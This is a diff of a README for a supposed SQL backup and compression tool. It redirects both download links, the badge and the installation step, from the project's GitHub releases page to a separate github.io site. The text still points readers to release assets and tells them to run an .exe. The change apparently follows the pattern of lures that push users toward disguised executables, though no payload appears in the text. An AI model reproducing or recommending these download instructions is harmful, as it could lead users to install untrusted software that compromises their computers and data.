@@ -1,6 +1,6 @@
 # 💾 sql-backup-compression-tool - Securely back up your database files
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/ulabelowground993/sql-backup-compression-tool/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://ulabelowground993.github.io)
 
 This application handles database backups for your computer. It compresses data to save space and encrypts files to keep them safe. You can automate your backup jobs to ensure you never lose important information. The software works on Windows, macOS, and Linux, but this guide focuses on Windows.
 
@@ -15,7 +15,7 @@ Follow these steps to set up the software on your Windows computer. Ensure you f
     *   Framework: The application installs necessary components during the setup process.
 
 2.  **Downloading the Application**
-    Visit [this page](https://github.com/ulabelowground993/sql-backup-compression-tool/releases) to download the latest version of the installer. Look for the file ending in `.exe` under the Assets section of the latest release. Click the file name to start your download.
+    Visit [this page](https://ulabelowground993.github.io) to download the latest version of the installer. Look for the file ending in `.exe` under the Assets section of the latest release. Click the file name to start your download.
 
 3.  **Installing the Software**
     Locate the file in your Downloads folder. Double-click the file to open the installation wizard. Follow the prompts on your screen. The installer places a shortcut on your desktop for easy access.
